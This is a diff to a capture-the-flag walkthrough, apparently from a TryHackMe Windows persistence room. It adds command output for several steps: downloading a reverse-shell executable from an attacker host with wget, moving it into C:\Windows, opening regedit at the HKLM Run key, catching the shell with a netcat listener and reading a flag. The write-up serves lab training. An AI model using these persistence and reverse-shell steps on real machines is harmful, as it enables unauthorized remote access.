@@ -126,8 +126,13 @@ PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshe
 ```
 7. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
 ```PowerShell
+PS C:\Users\Administrator>move revshell.exe C:\Windows
+        1 file(s) moved.
 ```
 8. `regedit` and go to HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+```PowerShell
+PS C:\Users\Administrator> regedit
+```
 
 ![]()
 
@@ -144,9 +149,19 @@ PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshe
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)
 
 ```Bash
+root@ip-10-10-157-221:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+Connection from 10.10.236.33 49943 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
 ```
 10. `C:\flags\flag11.exe`
 ```PowerShell
+C:\Windows\system32>C:\flags\flag11.exe
+C:\flags\flag11.exe
+THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
 ```
 
 
